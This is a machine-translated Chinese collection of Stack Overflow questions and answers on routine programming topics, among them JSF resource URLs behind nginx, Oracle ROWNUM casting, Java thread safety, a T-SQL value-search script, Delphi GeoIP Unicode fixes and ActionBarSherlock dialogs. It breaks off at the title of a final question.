JSF 资源由[`Resource`](http://docs.oracle.com/javaee/6/api/javax/faces/application/Resource.html)类表示，其中[`getRequestPath()`](http://docs.oracle.com/javaee/6/api/javax/faces/application/Resource.html#getRequestPath%28%29)方法负责返回资源 URL。您可以创建一个自定义`Resource`实现，其中相应地`getRequestPath()`实现/覆盖。

```
public class MyResource extends ResourceWrapper {

    private Resource wrapped;

    public MyResource(Resource wrapped) {
        this.wrapped = wrapped; 
    }

    @Override
    public String getRequestPath() {
        String contextPath = FacesContext.getCurrentInstance().getExternalContext().getRequestContextPath();
        return "." + wrapped.getRequestPath().substring(contextPath.length());
    }

    @Override
    public Resource getWrapped() {
        return wrapped;
    }

} 
```

现在，要通过此自定义实现覆盖默认 JSF `Resource`，您需要创建一个自定义[`ResourceHandler`](http://docs.oracle.com/javaee/6/api/javax/faces/application/ResourceHandler.html)实现，其中您`Resource`在方法中返回自定义实现[`createResource()`](http://docs.oracle.com/javaee/6/api/javax/faces/application/ResourceHandler.html#createResource%28java.lang.String,%20java.lang.String%29)。

```
public class MyResourceHandler extends ResourceHandlerWrapper {

    private ResourceHandler wrapped;

    public MyResourceHandler(ResourceHandler wrapped) {
        this.wrapped = wrapped;
    }

    @Override
    public Resource createResource(String resourceName, String libraryName) {
        return new MyResource(wrapped.createResource(resourceName, libraryName));
    }

    @Override
    public ResourceHandler getWrapped() {
        return wrapped;
    }

} 
```

最后，要让它运行，请将其注册`<resource-handler>`为`faces-config.xml`.

```
<application>
    <resource-handler>com.example.MyResourceHandler</resource-handler>
</application> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-04-16T20:31:35.233

我对这个答案有点晚了，但我遇到了同样的问题，并试图用“nginx”的方式来做。

所以也许这也有助于其他人。

您可以在您的 nginx 配置中定义第二个位置（这肯定取决于您的特定配置），它将匹配与该位置模式匹配的每个流量的特定规则。

您在 nginx 服务器配置中的第一个位置看起来与此有些相似：

```
 location / {
            proxy_set_header X-Forwarded-Host $host;
            proxy_set_header X-Forwarded-Server $host;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_pass http://localhost:8080/MyProject$request_uri;
    } 
```

那么您只需要为您的资源添加第二个位置，这将告诉 nginx 不要在重写中添加与特定位置模式匹配的资源的 MyProject，例如：

```
 location /MyProject {
            proxy_set_header X-Forwarded-Host $host;
            proxy_set_header X-Forwarded-Server $host;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_pass http://localhost:8080$request_uri;
    } 
```

请注意，“/MyProject/javax.faces.resource”的 proxy_pass 已更改。您的 js、图像和 css 现在应该再次正确交付。

更多关于位置的信息可以在 nginx[文档](http://nginx.org/en/docs/http/ngx_http_core_module.html#location)中找到。

# c++ - 如何忽略 boost::regex_search() 函数中的反斜杠字符？

> ID：11935233
> 
> 赞同：0
> 
> 时间：2012-08-13T13:28:21.263
> 
> 标签：c++, xml, linux, boost

我正在研究 C++，我正在从 xml 文件中获取正则表达式。我必须在一个长字符串中搜索这个正则表达式。例如我的正则表达式是：`".+myFunction"`

所以如果我必须把这个正则表达式放在 xml 文件中，那么我需要在上面的正则表达式中使用`backslach`字符。IE`'\'``'.'``"\.+myFunction"`

现在我正在使用`boost::regex_search()`函数在正则表达式上方进行搜索。但由于额外的反斜杠字符，函数返回 false。

那么如何在使用`boost::regex_search()`函数时忽略 backslach 字符？

示例代码如下：

```
string longString  = "hdh::dfjdj::dfuhgj::myFunction.devide.and"
string regularExp = "\.+myFunction"
const boost::regex searchPattern(regularExp);
if(boost::regex_search(longString, searchPattern))
{
    cout <<"Regular expresssion is found" << std::endl;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:38:08.703

你在问什么并不是很清楚：

*   在 XML 中，`".+myFunction" 是完全合法的。

*   如果您尝试匹配该精确序列，则需要两次转义反斜杠：一次是因为它在字符串文字中具有特殊含义，第二次是因为它对正则表达式具有特殊含义。如果引号是您要查找的内容的一部分，您还需要转义引号：`"\"\\\\.+myFunction\""`. 但是如果你想匹配一个精确的序列，你不需要正则表达式：`std::search`在很大程度上就足够了。

*   如果您尝试定义一个正则表达式，该正则表达式匹配一个或多个字符的序列，而不是换行符，后跟 sequence `"myFunction"`，初始化正则表达式的字符串文字将是`".+myFunction"`.

# sql - Oracle Rownum 演员表

> ID：11935235
> 
> 赞同：3
> 
> 时间：2012-08-13T13:28:23.753
> 
> 标签：sql, oracle, rownum

我正在尝试创建一个复杂的视图，该视图将通过 MS-SQL 服务器中的链接服务器进行访问。我遇到的问题是查询使用 ROWNUM 生成 ROWID。

生成的 ROWID 的数据类型为 NUMBER，但这显然给我带来了问题，如果我能把它变成 NUMBER（在此处插入大小），一切都会好起来的。但我不确定这是否可能。

```
CREATE OR REPLACE FORCE VIEW EXAMPLE ("ROW_ID")
AS
SELECT ROWNUM ROW_ID,
FROM
(SUB-QUERY) 
```

我无法提供完整的查询和列名（工作限制），但这里是 SQL Developer 中查询返回的列类型

![列类型](../Images/778a66964fdf33b79ed70b591aaf59d6.png)

我认为问题在于返回的 ROWNUM 数据类型是 Number 而不是 NUMBER(20) 或类似长度，并且这种交叉是我在链接服务器错误方面看到的问题，但如果有人知道不同，请告诉我;)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T13:39:13.413

您可以使用强制转换功能：`cast( rownum AS NUMBER(10)) as row_id`

```
create or replace view tvv as 
   select cast( rownum AS NUMBER(10)) as row_id 
   from all_objects 
   where rownum < 10;

> desc tvv
 Name              Null?    Typ
 ----------------- -------- ------------
 ROW_ID                     NUMBER(10) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T10:25:53.303

不是一个很好的解决方案，但通过删除 rownum 并从不同的角度解决问题，我已经删除了错误。

# java - 在Java中，条件表达式是线程安全的操作吗？

> ID：11935244
> 
> 赞同：3
> 
> 时间：2012-08-13T13:28:57.873
> 
> 标签：java, multithreading, thread-safety, race-condition, conditional-expressions

我想知道条件表达式是否是Java中的线程安全操作。
例如：

```
return (mObject != null ? mObject.toString() : "null"); 
```

所以，我的问题是：如果两个线程可以改变 mObject，这个代码线程安全吗，还是开发人员需要处理任何竞争条件？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-13T13:31:44.747

不，这绝对不是线程安全的。你绝对可以在`NullPointerException`这里得到一个。当然，这很容易修复：

```
Object tmp = mObject;
return tmp != null ? tmp.toString() : "null"; 
```

或者，在这种特殊情况下更容易：

```
return String.valueOf(mObject); 
```

编辑：如评论中所述，如果你真的有两个线程竞相更新一个没有同步的值，那*可能*是更大问题的迹象......但我只是试图回答你特别提出的问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T13:32:03.113

不，它不是线程安全的，只需制作以下内容的本地副本`mObject`：

```
final Object local = mObject;
return (local != null ? local.toString() : "null"); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-13T13:32:28.373

开发人员需要确保他们对任何可以更改的字段都有一致的看法。

这可能是一个解决方案

```
Object mObject = this.mObject;
return mObject != null ? mObject.toString() : "null"; 
```

或者

```
return String.valueOf(mObject); 
```

或者

```
return ""+mObject; 
```

# ruby-on-rails - Rails - rspec - 我如何运行所有集成测试，类似于 rake spec:models

> ID：11935255
> 
> 赞同：5
> 
> 时间：2012-08-13T13:29:34.153
> 
> 标签：ruby-on-rails, testing, rspec, integration-testing

以下命令有效：

```
rake spec:models
rake spec:controllers
rake spec:requests 
```

但以下没有：

```
rake spec:integration
rake spec:integrations 
```

如何单独运行所有集成测试？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T13:39:45.707

一种选择是使用`rspec spec/integration/*`我猜。
我希望得到一个像其他方法一样与 rake 一起使用的答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:44:22.923

实际上，请求规范*是*rspec 中的集成测试。有些测试是从 test::unit 继承的吗？

Test::Unit 是使用生成器创建的新 Rails 应用程序的默认测试库（除非指定了 -T 以跳过 test::unit 文件的创建），因此它将附带规范/集成，而对于 Rspec，约定是使用规范/请求。实际上，如果您现在尝试通过 生成新的 integration_test `rails g integration_test testname`，那将进入请求。

# ruby - 如何使用 github_api gem 从存储库中检索文件？

> ID：11935257
> 
> 赞同：1
> 
> 时间：2012-08-13T13:29:42.000
> 
> 标签：ruby, git, api, github

大多数文档都是关于授权的，以及如何检索 api 提供的基本对象。

如果我想要来自 repo 的特定文件怎么办？

比如说我/repo/blob/master/readme.md

我试过这个：

```
g.git_data.blobs.get("me", "repo", "master/readme.md") 
```

但我收到 404 错误。

我正在使用私人仓库，并使用基本身份验证（用户名和密码）创建了对象“g”

这是我正在使用的宝石：[https ://github.com/peter-murach/github/](https://github.com/peter-murach/github/)

更新，这就是我认证的方式：

```
g = Github.new :basic_auth => "me:password" 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T15:33:36.880

对我来说，它不适用于私有存储库，但要从公共存储库中检索文件信息，代码是

```
g.repos.contents.get 'kulbirsaini', 'gitlist', 'web/Makefile'

g.repos.contents.get 'kulbirsaini', 'gitlist', 'README.md' 
```

它必须与私有存储库有关。最好联系 Github 支持。

**如何从私有仓库获取文件的总结：**

```
g = Github.new(:basic_auth => "username:password")
file = g.repos.contents.get("username", "private_repo_name", "repo_path_to_file_relative_to_branch")
human_readable_data = Base64.decode64(file) 
```

示例`repo_path_to_file_relative_to_branch`：

```
/lib/core.rb 
```

并不是

```
/master/lib/core.rb 
```

# sql - 干草堆中的 TSQL 搜索针

> ID：11935259
> 
> 赞同：0
> 
> 时间：2012-08-13T13:29:46.103
> 
> 标签：sql, tsql

例如，我有数据库 A，并且我知道其中一个表中的某处是字段 B，其值为 C，但是我不知道该字段名称或表。

问题：在哪个表和字段中检测 (?) 值 C 的最快方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:50:01.500

我很久以前写过这个脚本，它对逆向工程非常有用

```
set nocount off

declare @searchvalue varchar(100)
set @searchvalue = 'text to find'

create table #tt (table_name varchar(64), column_name varchar(64), count int)
select * into #t from 
(
select 'select ''' + a.table_name + ''' ''table_name'',''' + a.column_name + ''' ''column_name'', count(*) count from [' + a.table_name +'] where [' +a.column_name+']='''+@searchvalue +'''' + ' group by ['+ a.column_name+']' sqlstring
from INFORMATION_SCHEMA.COLUMNS a
join 
INFORMATION_SCHEMA.TABLES b
on a.table_name = b.table_name
and b.table_type = 'base table'
 where data_type like '%char'
) a

--loop cursor
Declare @sqlstring as nvarchar(500)
Declare SqlCursor CURSOR FAST_FORWARD FOR
SELECT sqlstring FROM #t
OPEN SqlCursor
FETCH NEXT FROM SqlCursor
INTO @sqlstring
WHILE @@FETCH_STATUS = 0
BEGIN
      -- do row specific stuff here
insert #tt
exec(@sqlstring)
     FETCH NEXT FROM SqlCursor
     INTO @sqlstring
END
CLOSE SqlCursor
DEALLOCATE SqlCursor
select * from #tt
drop table #tt
drop table #t 
```

# java - 关于动态添加到数组的咨询

> ID：11935260
> 
> 赞同：-1
> 
> 时间：2012-08-13T13:29:53.270
> 
> 标签：java, android

如何向这个数组添加未知数量的颜色？例如我想添加 6 种颜色

```
int[] colors = new int[] { Color.RED, Color.YELLOW, Color.BLUE,Color.GREEN }; 
```

以及如何添加 categorySeries 的未知数字？例如我想添加 6 个 categorySeries

```
CategorySeries categorySeries = new CategorySeries("Vehicles Chart");
categorySeries.add("cars ", 30);
categorySeries.add("trucks", 20);
categorySeries.add("bikes ", 60);
categorySeries.add("plan ", 40); 
```

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:34:19.433

您不能将未知数量的项目添加到数组中，因为数组无法调整大小。

改为使用`ArrayList`：

```
List<CategorySeries> categorySeriess = new ArrayList<CategorySeries>();
CategorySeries categorySeries = new CategorySeries("Vehicles Chart");
categorySeries.add("cars ", 30);
categorySeries.add("trucks", 20);
categorySeries.add("bikes ", 60);
categorySeries.add("plan ", 40);
categorySeriess.add(categorySeries); 
```

对于颜色：

```
List<Integer> colors = new ArrayList<Integer>();
colors.add(Color.RED);  // single add
colors.addAll(Arrays.asList(Color.YELLOW, Color.BLUE, Color.GREEN));  // bulk add 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:32:39.323

考虑使用[ArrayList](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/ArrayList.html)，使用它的`add`方法，然后调用`toArray`它。这应该有效。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T13:36:09.383

如果您不知道要跟踪多少项，则数组可能不是数据结构的最佳选择。我会推荐一个链接列表。

退房`java.util.LinkedList`。您可以使用泛型类型来指定它应该包含哪种类型的元素。

例如，

```
import java.util.LinkedList;

public class Test {
    public static void main(String[] args) {
        LinkedList<Integer> ll = new LinkedList<Integer>();
        ll.push(1);
        ll.push(2);
    }
} 
```

或者，您可以`CategorySeries`使用`LinkedList<CategorySeries> ll = new LinkedList<CategorySeries>()`.

# delphi - Delphi中的Maxmind geoip查询

> ID：11935262
> 
> 赞同：3
> 
> 时间：2012-08-13T13:30:03.427
> 
> 标签：delphi, geoip

我正在查询 geoip 数据库（城市、国家、组织）以获取一堆 IP 地址。我查看了[http://www.maxmind.com/download/geoip/api/pascal/Sample.pas](http://www.maxmind.com/download/geoip/api/pascal/Sample.pas)并对其进行了修改：

```
function LookupCountry(IPAddr: string) : string;
var
   GeoIP: TGeoIP;
   GeoIPCountry: TGeoIPCountry;
begin
  GeoIP := TGeoIP.Create('C:\Users\Albert\Documents\RAD Studio\Projects\Parser\geoip\GeoIP.dat');
  try
    if GeoIP.GetCountry(IPAddr, GeoIPCountry) = GEOIP_SUCCESS then
    begin
      Result := GeoIPCountry.CountryName;
    end
    else
    begin
      Result := IPAddr;
    end;
  finally
    GeoIP.Free;
  end;
end; 
```

但我在超过 50'000 个查询中没有得到任何结果。我知道在使用 csv 时必须操纵地址，但我有二进制数据库版本。我错过了什么？

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T13:53:11.257

您遇到了众所周知的 ANSI/Unicode 不匹配问题。您使用的是 Unicode 版本的 Delphi（2009+ 版），[`the unit`](http://www.maxmind.com/download/geoip/api/pascal/GeoIP.pas)并且日期早于 Unicode 版本的 Delphi 发布。

在 Delphi 2009 以下（非 Unicode）中，类型类似于`string`或`PChar`映射到这些类型的 ANSI 版本，而自 Delphi 2009 到 Unicode 版本。

***1.批量更换：***

要修复这个[`GeoIP.pas`](http://www.maxmind.com/download/geoip/api/pascal/GeoIP.pas)单元，首先，替换所有出现的：

```
 PChar  -> PAnsiChar
 string -> AnsiString 
```

***2.小​​改动：***

完成替换后，将第`AnsiString`93 行的类型更改回`string`类型：

```
 92  public
 93    constructor Create(const FileName: AnsiString); // <- string
 94  ... 
```

在第 138 行也是如此：

```
138  constructor TGeoIP.Create(const FileName: AnsiString); // <- string
139  begin
140    inherited Create; 
```

# .net - 将 Selenium WebDriver 附加到已打开的 Firefox

> ID：11935265
> 
> 赞同：1
> 
> 时间：2012-08-13T13:30:21.173
> 
> 标签：.net, selenium, integration-testing, selenium-webdriver

我正在为 C# 库进行集成测试。我正在测试的 .NET 代码中的步骤之一是使用正确的 url 地址打开 Firefox。我的集成测试应该向我的库提供一些数据，等待 firefox 启动并检查网页是否包含正确的数据。要使用 selenium，我必须以某种方式附加到我的图书馆正在午餐的 Firefox。硒可以吗？还有其他图书馆可以帮助我吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T13:47:48.130

这很容易用[WatiN](http://www.watin.org/)完成。

解释附加到现有浏览器的文档在[这里](http://watinandmore.blogspot.com/2010/01/browserattachto-and-iattachto.html)。

您在测试中需要执行的操作以附加到库打开的浏览器的要点基本上是：

```
// make library call that creates Firefox here
// ...

var browser = Browser.AttachTo<Firefox>(Find.ByUrl(MyUrl)); // or use another way of finding your browser instance if you wish

// do tests with browser variable using WatiN's API (an obvious first step is to fail test if browser is null) 
```

# c# - 如何在使用第二种形式时更改第一种形式的属性？

> ID：11935268
> 
> 赞同：1
> 
> 时间：2012-08-13T13:30:40.223
> 
> 标签：c#, winforms, forms

我正在使用两种形式，当出现第二种形式时，我禁用第一种形式。当第二个表单关闭时，我找不到启用第一个表单的方法。传递参数可能是一种解决方案，但我敢打赌有一种更简单的方法。首先，我想在第二个的析构函数上启用第一个表单，但无法做到。有人有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:34:20.870

您可以使用 ShowDialog() 显示第二个表单 - 表单将显示为模态，第一个表单只有在第二个关闭时才会启用。

对于未来的问题，您可以使用第二种形式的字段来拥有第一个实例，并在需要时使用该实例，例如，您可以使用自定义构造函数：

```
class SecondForm: Form
{
   FirstForm _parentForm;

   public SeconForm(FirstForm form)
   {
      InitializeComponent();
      _parentForm = form;
   }

   void DoSomethingWithParent()
   {
      _parentForm.DoSomesting();
   }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T13:54:26.833

如前所述，在这种特定情况下，使用模式对话框打开第二个表单可能是有意义的。

为了涵盖不适用的情况，公认的最佳实践是从第一种形式订阅`FormClosing`第二种形式的事件，并且在事件处理程序中，您可以启用“您自己”并执行您可能想做的任何其他事情由于另一个表单被关闭而执行。这是一个简单的例子：

```
public partial class ParentForm : Form
{
    private void button1_Click(object sender, EventArgs e)
    {
        ChildForm child = new ChildForm();

        child.FormClosing += new FormClosingEventHandler(child_FormClosing);
        Hide();
        child.Show();
    }

    private void child_FormClosing(object sender, FormClosingEventArgs e)
    {
        Show();
    }
} 
```

# asp.net - asp.net HyperLink 动态创建 NavigateUrl 路径

> ID：11935272
> 
> 赞同：0
> 
> 时间：2012-08-13T13:30:52.570
> 
> 标签：asp.net, hyperlink

我在我的 asp.net 页面中有这个：

```
<% foreach (Product item in ProductList())
           {
            %>
          <div id="i<%:item.CODE %>" class="item" dir="rtl">
               <label class="code"><%:item.CODE %></label>
       <asp:HyperLink runat="server" ID="DetailsLink" Text="Details" 
       NavigateUrl="~/Details.aspx?ProductCode=<%:item.CODE %>" font-size="18px"></asp:HyperLink>
          </div>
         <% } %> 
```

虽然第一个 <%:item.CODE%> 有效并且我可以看到项目的代码编写，

在 NavigateUrl 字符串中它不起作用。

我得到一个链接到“http://localhost:34546/Details.aspx?ProductCode=<%:item.CODE %>”

如何将项目的代码连接到链接？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:35:45.203

试试这个

```
 <% foreach (String str in new string[] { "Apple", "Mango", "Orange" })
       {
    %>
    <div id="i<%: str %>" class="item" dir="rtl">
        <label class="code">
            <%: str %></label>
               <a href='<%: "Details.aspx?ProductCode=" + str %>'>DetailsLink</a>
    </div>
    <% } %> 
```

代替

```
<asp:HyperLink runat="server" 
       ID="DetailsLink" 
       Text="Details" 
       NavigateUrl="~/Details.aspx?ProductCode=<%:item.CODE %>" 
       font-size="18px"/> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:39:53.023

您应该使用中继器控件并处理其 ItemDataBound 事件。这将使您的代码更清晰且易于调试。

在您的 .aspx.cs 文件中：

```
protected void rpt_ItemDataBound(object sender, RepeaterItemEventArgs e)
        {
            if (e.Item.ItemType == ListItemType.Item || e.Item.ItemType == ListItemType.AlternatingItem)
            {

                Product item = e.Item.DataItem as Product ;
                HyperLink DetailsLink = e.Item.FindControl("DetailsLink") as HyperLink;
                DetailsLink.NavigateUrl= "~/Details.aspx?ProductCode=" + item.CODE;

            }
        }

protected void Page_Load(object sender, EventArgs e)
        {
            rpt.DataSource = ProductList();
            rpt.DataBind();
        } 
```

在您的 .aspx 文件中：

```
 <asp:Repeater ID="rpt" runat="server">                                                   <ItemTemplate>                                                            
     <asp:HyperLink runat="server" ID="DetailsLink" Text="Details" 
        font-size="18px"></asp:HyperLink>                             
  </ItemTemplate>
 </asp:Repeater> 
```

# ruby - Ruby 在每个循环中输出无论如何？

> ID：11935274
> 
> 赞同：0
> 
> 时间：2012-08-13T13:30:56.343
> 
> 标签：ruby

我不知道为什么会这样。这是代码：

```
def calculate_discount items
    items.each do |item|
        #Nothing here
    end
end

items = [5, 100]
calculate_discounts items 
```

然后当我在命令行中运行它时，我得到：

```
5
100 
```

还有人知道发生了什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:48:20.827

返回值并不意味着实际打印了该值。

使用 IRB 时，“p”函数显示函数返回的值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:43:00.617

Ruby 的函数总是返回一个值。如果您没有 return 语句，那么 Ruby 会返回函数中计算的最后一个值。Ruby 的集合迭代器也返回一个值：

```
irb(main):018:0> [1,2,3].each do |item|
irb(main):019:1* end
=> [1, 2, 3] 
```

因此，在这种情况下，“calculate_discount”返回“items”的元素。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T13:40:58.720

知道了。对不起，我很愚蠢，因为我有一段时间没有编写 ruby​​ 代码了。我忘记了 ruby​​ 会自动返回最后一个值。

# cocoa-touch - GCDAsyncUdpSocket 丢弃数据包并创建大量 DISPATCH_WORKER_THREADs

> ID：11935287
> 
> 赞同：5
> 
> 时间：2012-08-13T13:31:24.963
> 
> 标签：cocoa-touch, debugging, grand-central-dispatch, cocoaasyncsocket

我正在构建一个多播客户端，`GCDAsyncUdpSocket`并且面临很多数据包丢失。

我已经使用 Wireshark 监控了服务器，并使用 AirCap 捕获了空中的 WiFi 数据包，我确信数据包传输正确。我还查看了库中的调试跟踪`GCDAsyncUdpSocket`，我发现有时`socket4FDBytesAvailable:`会用一个大参数调用它，比如 4000，但是当它读取套接字时，它读取的字节更少——可能是 500——这就是数据包丢失的地方。我增加了套接字缓冲区，但这无济于事。

最后，我注意到使用 Instruments 的时间分析器，无论巧合与否，每次我丢失数据包时都会创建一个新的 DISPATCH_WORKER_THREAD 实例。这是正常的吗？

# android - android中布局的setRotation

> ID：11935291
> 
> 赞同：0
> 
> 时间：2012-08-13T13:31:31.167
> 
> 标签：android, rotation

我是android开发的新手，我正在使用setRotation方法来旋转整个布局，但我想设置旋转的持续时间

while (fromDegree < toDegree) { fromDegree++; myLayout.setRotation(fromDegree); }

有人可以帮忙吗

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:41:13.147

使用带有 PostDelayed 方法的 Handler 类。

例子：

```
 public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.splash);

        (new Handler()).postDelayed(new splashHandler(), 2000);
    }

    class splashHandler implements Runnable{

        @Override
        public void run() {

            .....Do something.....
        }
    } 
```

# eclipse - Eclipse Juno 不保存密码（SVN 和 RSE）

> ID：11935292
> 
> 赞同：4
> 
> 时间：2012-08-13T13:31:32.023
> 
> 标签：eclipse, svn, ubuntu

我刚刚使用以下软件包安装了**Eclipse Juno ：**

*   子剪辑 1.8.14
*   Subversion 客户端适配器 1.8.3
*   SVNKit 库 1.7.5
*   SVNKit 客户端适配器 1.7.5
*   远程系统资源管理器用户操作 1.1.400
*   远程系统资源管理器最终用户运行时 3.4.0

我可以毫无问题地配置和访问远程存储库和 ssh 连接。但是每次我关闭 Eclipse 并重新运行它时，当我尝试连接到远程机器或远程存储库时，即使我选择保存它，也总是要求我输入密码。

以前版本的 Eclipse（Indigo 或 Helios）不会发生这种情况。有没有人有同样的问题并且能够解决它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T01:28:53.190

看起来像这个[问题](http://issues.tmatesoft.com/issue/SVNKIT-290?projectKey=SVNKIT&query=#SVNKIT-290)。在最新的 SVNKit 主干中解决，但该修复尚未包含在任何版本中。

# android - ActionBarSherlock 对话框不透明且不暗

> ID：11935293
> 
> 赞同：2
> 
> 时间：2012-08-13T13:31:32.613
> 
> 标签：android, dialog, transparent, actionbarsherlock, android-theme

我正在使用[ActionBarSherlock (ABS)](http://actionbarsherlock.com/)，并想在我的应用程序中添加一个对话框，正如项目提供的[*ABS Demos Sample*应用程序](http://actionbarsherlock.com/download.html)中所看到的那样。对话框示例如下所示：

![ActionBarSherlock 对话框](../Images/e252fc85f5b39ac9cb85f647453af675.png)

我自己创建了一个活动。这是相关的源代码：

```
public class Dialog extends SherlockActivity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        setTheme(R.style.Sherlock___Theme_DarkActionBar);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_dialog);
    }
} 
```

`setTheme()`出于某种原因，尽管 ABS 示例没有这样做，但Android 强制我添加。如果我忽略它，我将遇到以下错误。

```
java.lang.IllegalStateException: You must use Theme.Sherlock, Theme.Sherlock.Light, Theme.Sherlock.Light.DarkActionBar, or a derivative. 
```

My`AndroidManifest.xml`具有以下设置，与 ABS 示例中的设置非常相似。

```
<activity
    android:name=".activities.Dialog"
    android:label="@string/title_activity_dialog"
    android:theme="@style/Theme.Sherlock.Dialog" >
</activity> 
```

以下屏幕截图显示了我的对话活动的样子。

![自定义对话框](../Images/ef8587ac2b1ccc5d6c7c29d3d48cd22f.png)

我正在使用带有地图支持的 ActionBarSherlock 4.1.0，Android 支持库 v4。

**问题：**你能弄清楚为什么它看起来如此不同吗？

*   深色与浅色用户界面
*   透明与不透明背景
*   有和没有操作栏

* * *

**更新：**

ABS 示例按如下方式启动对话活动：

```
protected void onListItemClick(ListView l, View v, int position, long id) {
    Map<String, Object> map = (Map<String, Object>)l.getItemAtPosition(position);
    Intent intent = (Intent) map.get("intent");
    startActivity(intent);
} 
```

我按如下方式启动对话活动：

```
public boolean onCreateOptionsMenu(Menu menu) {
    menu.add(R.string.title_menuItemDialogActivtiy)
        .setIcon(R.drawable.ic_action_dialog)
        .setIntent(new Intent(this, Dialog.class))
        .setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
    return true;
} 
```

* * *

同时，我看到[这种模式](http://developer.android.com/reference/android/app/Activity.html#onCreateDialog%28int%29)已被**弃用**。相反，我可以使用[DialogFragment](http://developer.android.com/reference/android/app/DialogFragment.html)。这里出现的问题：如何将片段与操作菜单项集成？

* * *

**替代解决方案：**

我决定使用 a`DialogFragment`而不是 an`Activity`因为我估计它更“未来安全”。我基本上遵循了内容非常丰富的教程[Using DialogFragments（2012 年 6 月 3 日发布）](http://android-developers.blogspot.de/2012/05/using-dialogfragments.html)，我喜欢将其推荐为任何感兴趣的读者的完美起点。此外，我喜欢添加相关且有用的帖子：

*   [验证用户输入](https://stackoverflow.com/a/8260521/356895)
*   [软键盘与单独的 DONE 按钮](https://stackoverflow.com/a/6144287/356895)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T16:03:28.750

您看到的输出肯定来自在 Java 代码中设置主题（这将覆盖 XML 中设置的值）。我刚刚建立了以下示例应用程序（这实际上就是所有内容）并通过添加额外的`setTheme()`调用来复制问题。

```
<application android:icon="@drawable/icon" android:label="@string/app_name">
    <activity android:name=".Dialog"
        android:theme="@style/Theme.Sherlock.Dialog">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
</application> 
```

而对话...

```
public class Dialog extends SherlockActivity {
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView text = new TextView(this);
        text.setText("This is a dialog!");

        setContentView(text);
    }
} 
```

现在关于为什么没有那个额外的方法你会得到一个异常，那是另一回事（而且很奇怪）。正如你所看到的，它应该使用我上面提供的尽可能少的代码。

也许确保库项目和您的项目都至少使用 Android 4.0 (API 14) 进行编译，因为这是库的要求。

除此之外，如果你只是想在你的应用程序中显示一个对话框，它是否需要是一个主题活动？这并不常见。您也可以随时创建一个简单的`Dialog`或`AlertDialog`子类来显示。 [在这里](http://developer.android.com/guide/topics/ui/dialogs.html)查看更多信息...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T14:00:57.893

尝试为应用程序设置主题。

```
<application
    android:theme="@style/Theme.Sherlock" 
```

对话应该继承主题。如果您已经设置了，则删除活动声明中的 android:theme 标记和 setTheme() 调用，看看会发生什么。在没有 setTheme 的情况下出现错误的原因是因为 SherlockActivities 必须在错误消息中包含主题之一，并且您在清单中将其设置为其他内容 setTheme() 在遇到麻烦之前覆盖了它。

# validation - 不同动作的不同验证规则 JSF

> ID：11935294
> 
> 赞同：0
> 
> 时间：2012-08-13T13:31:36.143
> 
> 标签：validation, jsf, file-upload, tomahawk

我正在尝试实现一个编辑/添加配置文件页面，如下所示：

*   带有上传按钮的图片上传组件（Tomahawk t:inputFileUpload）
*   几个输入文本字段
*   取消并保存按钮

如前所述，此表单用于添加新配置文件以及编辑现有配置文件。起初，我使用了两个元素，一个用于文本输入，一个用于上传组件。这样做的问题是，由于上传组件不支持 ajax/部分渲染，整个页面会重新加载，文本输入的任何更改都会丢失。当我使用统一时，当按下上传按钮并强制用户首先填写所有输入时，在文本字段上触发验证，然后才能上传图像。

我想要的行为是，如果文本输入没有改变，我仍然可以上传图片，同时将更改应用于支持 bean 并进行验证。只有在按下最终提交按钮时才应触发对未更改/空字段的验证。如何才能做到这一点？任何标准方案/最佳实践方法，还是我必须实现 valueChange 监听器？提前谢谢你们和亲切的问候！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:20:38.100

解决了这个问题，我编写了一个自定义验证器并检查了触发表单提交的操作：

```
 ctx.getExternalContext().getRequestParameterValuesMap().containsKey("form:uploadButton"); 
```

其中 ctx 是 FacesContext 的当前实例。也许这对某人有所帮助，这是一种解决方法，但是可以完成工作。

# java - HTTP API 已弃用警告 UTF_8、Scheme、ThreadSafeClientConnManager

> ID：11935299
> 
> 赞同：5
> 
> 时间：2012-08-13T13:31:54.987
